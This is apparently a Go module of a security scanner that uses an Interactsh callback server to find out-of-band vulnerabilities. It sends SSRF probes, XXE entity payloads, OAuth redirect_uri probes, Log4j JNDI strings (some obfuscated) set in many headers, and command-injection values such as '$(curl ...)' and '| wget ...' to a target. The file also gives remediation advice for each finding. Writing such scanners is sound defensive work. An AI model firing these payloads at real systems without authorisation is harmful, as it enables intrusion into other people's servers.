package oob

import (
	"context"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/projectdiscovery/interactsh/pkg/client"
	"github.com/yourusername/shells/internal/core"
	"github.com/yourusername/shells/pkg/types"
)

type interactshScanner struct {
	client   *client.Client
	payloads map[string]PayloadInfo
	logger   interface {
		Info(msg string, keysAndValues ...interface{})
		Error(msg string, keysAndValues ...interface{})
		Debug(msg string, keysAndValues ...interface{})
	}
}

type PayloadInfo struct {
	VulnType    string
	Target      string
	TestCase    string
	Description string
	Severity    types.Severity
}

type OOBConfig struct {
	ServerURL            string
	Token                string
	PollDuration         time.Duration
	CollaboratorDuration time.Duration
	DisableHTTPFallback  bool
}

func NewInteractshScanner(config OOBConfig, logger interface {
	Info(msg string, keysAndValues ...interface{})
	Error(msg string, keysAndValues ...interface{})
	Debug(msg string, keysAndValues ...interface{})
}) (core.Scanner, error) {
	options := &client.Options{
		ServerURL:           config.ServerURL,
		Token:               config.Token,
		PollDuration:        config.PollDuration,
		DisableHTTPFallback: config.DisableHTTPFallback,
	}
	
	if options.ServerURL == "" {
		options.ServerURL = "https://interact.sh"
	}
	if options.PollDuration == 0 {
		options.PollDuration = 5 * time.Second
	}
	
	interactshClient, err := client.New(options)
	if err != nil {
		return nil, fmt.Errorf("failed to create interactsh client: %w", err)
	}
	
	return &interactshScanner{
		client:   interactshClient,
		payloads: make(map[string]PayloadInfo),
		logger:   logger,
	}, nil
}

func (s *interactshScanner) Name() string {
	return "interactsh"
}

func (s *interactshScanner) Type() types.ScanType {
	return types.ScanType("oob_testing")
}

func (s *interactshScanner) Validate(target string) error {
	if target == "" {
		return fmt.Errorf("target cannot be empty")
	}
	
	if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
		return fmt.Errorf("target must be a valid HTTP/HTTPS URL")
	}
	
	return nil
}

func (s *interactshScanner) Scan(ctx context.Context, target string, options map[string]string) ([]types.Finding, error) {
	s.logger.Info("Starting OOB testing with Interactsh", "target", target)
	
	// Start polling for interactions
	s.client.StartPolling(ctx, func(interaction *client.Interaction) {
		s.logger.Debug("Received interaction", 
			"protocol", interaction.Protocol,
			"unique_id", interaction.UniqueID,
			"raw_request", interaction.RawRequest,
		)
	})
	
	findings := []types.Finding{}
	
	// Test 1: SSRF via various injection points
	ssrfFindings := s.testSSRF(ctx, target, options)
	findings = append(findings, ssrfFindings...)
	
	// Test 2: XXE (XML External Entity)
	xxeFindings := s.testXXE(ctx, target, options)
	findings = append(findings, xxeFindings...)
	
	// Test 3: OAuth2 Redirect URI SSRF
	oauthFindings := s.testOAuth2SSRF(ctx, target, options)
	findings = append(findings, oauthFindings...)
	
	// Test 4: Log4j / Log injection
	logFindings := s.testLogInjection(ctx, target, options)
	findings = append(findings, logFindings...)
	
	// Test 5: DNS exfiltration
	dnsFindings := s.testDNSExfiltration(ctx, target, options)
	findings = append(findings, dnsFindings...)
	
	// Test 6: Blind Command Injection
	cmdFindings := s.testBlindCommandInjection(ctx, target, options)
	findings = append(findings, cmdFindings...)
	
	// Wait for interactions and check results
	time.Sleep(30 * time.Second) // Give time for interactions
	
	// Check for any received interactions
	interactions := s.client.GetInteractions()
	for _, interaction := range interactions {
		if payload, exists := s.payloads[interaction.UniqueID]; exists {
			finding := types.Finding{
				Tool:     "interactsh",
				Type:     payload.VulnType,
				Severity: payload.Severity,
				Title:    fmt.Sprintf("Out-of-Band %s Detected", payload.VulnType),
				Description: fmt.Sprintf("%s detected via OOB interaction. %s", 
					payload.VulnType, payload.Description),
				Evidence: fmt.Sprintf("Protocol: %s\nUniqueID: %s\nTarget: %s\nTest Case: %s\nRaw Request:\n%s",
					interaction.Protocol, interaction.UniqueID, payload.Target, 
					payload.TestCase, interaction.RawRequest),
				Solution: s.getSolution(payload.VulnType),
				Metadata: map[string]interface{}{
					"protocol":    interaction.Protocol,
					"unique_id":   interaction.UniqueID,
					"target":      payload.Target,
					"test_case":   payload.TestCase,
					"interaction": interaction,
				},
			}
			findings = append(findings, finding)
		}
	}
	
	s.client.StopPolling()
	s.client.Close()
	
	return findings, nil
}

func (s *interactshScanner) testSSRF(ctx context.Context, target string, options map[string]string) []types.Finding {
	findings := []types.Finding{}
	
	// Generate unique URL for this test
	interactURL, err := s.client.URL()
	if err != nil {
		s.logger.Error("Failed to generate interact URL", "error", err)
		return findings
	}
	
	s.payloads[extractUniqueID(interactURL)] = PayloadInfo{
		VulnType:    "SSRF",
		Target:      target,
		TestCase:    "URL parameter injection",
		Description: "Server-Side Request Forgery allows attacker to make requests from the server",
		Severity:    types.SeverityHigh,
	}
	
	// Common SSRF injection points
	ssrfParams := []string{
		"url", "uri", "redirect", "link", "src", "source", "target", 
		"rurl", "dest", "destination", "callback", "endpoint", "api",
		"webhook", "feed", "xml", "json", "jsonp", "proxy", "service",
	}
	
	baseURL, _ := url.Parse(target)
	
	for _, param := range ssrfParams {
		// Test various encoding methods
		encodedURLs := []string{
			interactURL,                                    // Plain
			url.QueryEscape(interactURL),                   // URL encoded
			fmt.Sprintf("http://169.254.169.254@%s", extractHostFromURL(interactURL)), // AWS metadata bypass
			fmt.Sprintf("http://localhost@%s", extractHostFromURL(interactURL)),       // localhost bypass
			fmt.Sprintf("http://127.0.0.1@%s", extractHostFromURL(interactURL)),      // 127.0.0.1 bypass
		}
		
		for _, encodedURL := range encodedURLs {
			testURL := fmt.Sprintf("%s?%s=%s", target, param, encodedURL)
			
			s.logger.Debug("Testing SSRF", "url", testURL, "param", param)
			
			// Send request and don't wait for response - we'll catch it via OOB
			req, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
			if err != nil {
				continue
			}
			
			client := &http.Client{Timeout: 10 * time.Second}
			_, err = client.Do(req)
			// Ignore errors - we only care about OOB callbacks
		}
	}
	
	// Test POST data injection
	postData := url.Values{}
	for _, param := range ssrfParams {
		postData.Set(param, interactURL)
	}
	
	req, err := http.NewRequestWithContext(ctx, "POST", target, strings.NewReader(postData.Encode()))
	if err == nil {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		client := &http.Client{Timeout: 10 * time.Second}
		client.Do(req)
	}
	
	return findings
}

func (s *interactshScanner) testXXE(ctx context.Context, target string, options map[string]string) []types.Finding {
	findings := []types.Finding{}
	
	interactURL, err := s.client.URL()
	if err != nil {
		return findings
	}
	
	s.payloads[extractUniqueID(interactURL)] = PayloadInfo{
		VulnType:    "XXE",
		Target:      target,
		TestCase:    "XML External Entity injection",
		Description: "XML External Entity injection allows reading arbitrary files and SSRF",
		Severity:    types.SeverityCritical,
	}
	
	// XXE payloads
	xxePayloads := []string{
		fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "%s">
]>
<root>&xxe;</root>`, interactURL),
		
		fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY %% xxe SYSTEM "%s">
%%xxe;
]>
<root>test</root>`, interactURL),
		
		fmt.Sprintf(`<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY file SYSTEM "%s" >
]>
<data>&file;</data>`, interactURL),
	}
	
	for _, payload := range xxePayloads {
		req, err := http.NewRequestWithContext(ctx, "POST", target, strings.NewReader(payload))
		if err != nil {
			continue
		}
		
		req.Header.Set("Content-Type", "application/xml")
		req.Header.Set("Content-Type", "text/xml")
		
		client := &http.Client{Timeout: 10 * time.Second}
		client.Do(req)
	}
	
	return findings
}

func (s *interactshScanner) testOAuth2SSRF(ctx context.Context, target string, options map[string]string) []types.Finding {
	findings := []types.Finding{}
	
	interactURL, err := s.client.URL()
	if err != nil {
		return findings
	}
	
	s.payloads[extractUniqueID(interactURL)] = PayloadInfo{
		VulnType:    "OAuth2_SSRF",
		Target:      target,
		TestCase:    "OAuth2 redirect_uri SSRF",
		Description: "OAuth2 redirect_uri parameter vulnerable to SSRF",
		Severity:    types.SeverityHigh,
	}
	
	// OAuth2 SSRF via redirect_uri
	oauthEndpoints := []string{
		"/oauth/authorize",
		"/oauth2/authorize", 
		"/auth/oauth/authorize",
		"/connect/authorize",
		"/.well-known/openid-configuration",
	}
	
	clientID := options["client_id"]
	if clientID == "" {
		clientID = "test"
	}
	
	for _, endpoint := range oauthEndpoints {
		oauthURL := fmt.Sprintf("%s%s?client_id=%s&redirect_uri=%s&response_type=code&state=test",
			strings.TrimRight(target, "/"), endpoint, clientID, url.QueryEscape(interactURL))
		
		req, err := http.NewRequestWithContext(ctx, "GET", oauthURL, nil)
		if err != nil {
			continue
		}
		
		client := &http.Client{Timeout: 10 * time.Second}
		client.Do(req)
	}
	
	return findings
}

func (s *interactshScanner) testLogInjection(ctx context.Context, target string, options map[string]string) []types.Finding {
	findings := []types.Finding{}
	
	interactURL, err := s.client.URL()
	if err != nil {
		return findings
	}
	
	s.payloads[extractUniqueID(interactURL)] = PayloadInfo{
		VulnType:    "Log_Injection",
		Target:      target,
		TestCase:    "Log4j / logging injection",
		Description: "Log injection vulnerability allows remote code execution",
		Severity:    types.SeverityCritical,
	}
	
	// Log4j and other log injection payloads
	logPayloads := []string{
		fmt.Sprintf("${jndi:ldap://%s/a}", extractHostFromURL(interactURL)),
		fmt.Sprintf("${jndi:dns://%s}", extractHostFromURL(interactURL)),
		fmt.Sprintf("${jndi:rmi://%s/a}", extractHostFromURL(interactURL)),
		fmt.Sprintf("${jndi:ldaps://%s/a}", extractHostFromURL(interactURL)),
		fmt.Sprintf("${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://%s/a}", extractHostFromURL(interactURL)),
		fmt.Sprintf("$${jndi:ldap://%s/a}", extractHostFromURL(interactURL)),
	}
	
	// Test in various headers and parameters
	injectionPoints := []string{
		"User-Agent", "X-Forwarded-For", "X-Real-IP", "X-Originating-IP",
		"X-Remote-IP", "X-Remote-Addr", "X-Client-IP", "CF-Connecting-IP",
		"True-Client-IP", "X-Cluster-Client-IP", "Forwarded", "Via",
	}
	
	for _, payload := range logPayloads {
		// Test in headers
		req, err := http.NewRequestWithContext(ctx, "GET", target, nil)
		if err != nil {
			continue
		}
		
		for _, header := range injectionPoints {
			req.Header.Set(header, payload)
		}
		
		client := &http.Client{Timeout: 10 * time.Second}
		client.Do(req)
		
		// Test in URL parameters
		testURL := fmt.Sprintf("%s?search=%s&q=%s&query=%s", target, 
			url.QueryEscape(payload), url.QueryEscape(payload), url.QueryEscape(payload))
		
		req2, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
		if err != nil {
			continue
		}
		client.Do(req2)
	}
	
	return findings
}

func (s *interactshScanner) testDNSExfiltration(ctx context.Context, target string, options map[string]string) []types.Finding {
	findings := []types.Finding{}
	
	interactURL, err := s.client.URL()
	if err != nil {
		return findings
	}
	
	s.payloads[extractUniqueID(interactURL)] = PayloadInfo{
		VulnType:    "DNS_Exfiltration",
		Target:      target,
		TestCase:    "DNS data exfiltration",
		Description: "DNS queries can be used to exfiltrate sensitive data",
		Severity:    types.SeverityMedium,
	}
	
	// DNS exfiltration payloads
	dnsHost := extractHostFromURL(interactURL)
	dnsPayloads := []string{
		fmt.Sprintf("nslookup %s", dnsHost),
		fmt.Sprintf("dig %s", dnsHost),
		fmt.Sprintf("host %s", dnsHost),
		fmt.Sprintf("ping -c 1 %s", dnsHost),
	}
	
	for _, payload := range dnsPayloads {
		// Test command injection that could lead to DNS exfiltration
		testParams := []string{"cmd", "command", "exec", "system", "eval", "ping", "host"}
		
		for _, param := range testParams {
			testURL := fmt.Sprintf("%s?%s=%s", target, param, url.QueryEscape(payload))
			
			req, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
			if err != nil {
				continue
			}
			
			client := &http.Client{Timeout: 10 * time.Second}
			client.Do(req)
		}
	}
	
	return findings
}

func (s *interactshScanner) testBlindCommandInjection(ctx context.Context, target string, options map[string]string) []types.Finding {
	findings := []types.Finding{}
	
	interactURL, err := s.client.URL()
	if err != nil {
		return findings
	}
	
	s.payloads[extractUniqueID(interactURL)] = PayloadInfo{
		VulnType:    "Blind_Command_Injection",
		Target:      target,
		TestCase:    "Blind command injection via HTTP callback",
		Description: "Command injection vulnerability detected via out-of-band HTTP request",
		Severity:    types.SeverityCritical,
	}
	
	// Blind command injection payloads
	cmdPayloads := []string{
		fmt.Sprintf("; curl %s ;", interactURL),
		fmt.Sprintf("& curl %s &", interactURL),
		fmt.Sprintf("| curl %s", interactURL),
		fmt.Sprintf("`curl %s`", interactURL),
		fmt.Sprintf("$(curl %s)", interactURL),
		fmt.Sprintf("; wget %s ;", interactURL),
		fmt.Sprintf("& wget %s &", interactURL),
		fmt.Sprintf("| wget %s", interactURL),
	}
	
	// Test various injection parameters
	cmdParams := []string{
		"cmd", "command", "exec", "system", "run", "execute", "shell",
		"bash", "sh", "powershell", "ps", "eval", "ping", "host", "nslookup",
	}
	
	for _, payload := range cmdPayloads {
		for _, param := range cmdParams {
			testURL := fmt.Sprintf("%s?%s=%s", target, param, url.QueryEscape(payload))
			
			req, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
			if err != nil {
				continue
			}
			
			client := &http.Client{Timeout: 10 * time.Second}
			client.Do(req)
		}
	}
	
	return findings
}

// Helper functions
func extractUniqueID(interactURL string) string {
	parts := strings.Split(interactURL, ".")
	if len(parts) > 0 {
		return parts[0]
	}
	return interactURL
}

func extractHostFromURL(interactURL string) string {
	u, err := url.Parse(interactURL)
	if err != nil {
		return interactURL
	}
	return u.Host
}

func (s *interactshScanner) getSolution(vulnType string) string {
	solutions := map[string]string{
		"SSRF": "Implement proper input validation and whitelist allowed destinations. " +
			"Use internal network segmentation and disable unnecessary protocols.",
		"XXE": "Disable XML external entity processing in all XML parsers. " +
			"Use secure XML parsing configurations and validate all XML input.",
		"OAuth2_SSRF": "Implement strict redirect_uri validation using exact string matching. " +
			"Maintain a whitelist of allowed redirect URIs.",
		"Log_Injection": "Update Log4j to version 2.17.0 or later. " +
			"Disable JNDI lookups and implement proper log sanitization.",
		"DNS_Exfiltration": "Monitor DNS queries for suspicious patterns. " +
			"Implement network segmentation and DNS filtering.",
		"Blind_Command_Injection": "Use parameterized commands and avoid dynamic command construction. " +
			"Implement proper input validation and sanitization.",
	}
	
	if solution, ok := solutions[vulnType]; ok {
		return solution
	}
	return "Implement proper input validation and security controls to prevent injection attacks."
}